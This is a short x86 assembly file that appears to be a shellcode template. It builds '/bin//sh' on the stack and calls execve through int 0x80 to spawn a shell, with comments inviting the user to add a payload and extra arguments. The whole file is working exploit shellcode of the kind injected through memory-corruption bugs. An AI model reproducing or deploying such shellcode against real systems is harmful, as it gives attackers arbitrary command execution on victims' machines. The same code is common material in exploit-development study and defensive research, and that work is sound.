global _start
_start:

    xor eax, eax
    push eax
    ;add your payload here
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    ;add your additional argument here
    ;mov ecx, esp
    ;push eax
    ;push ecx
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
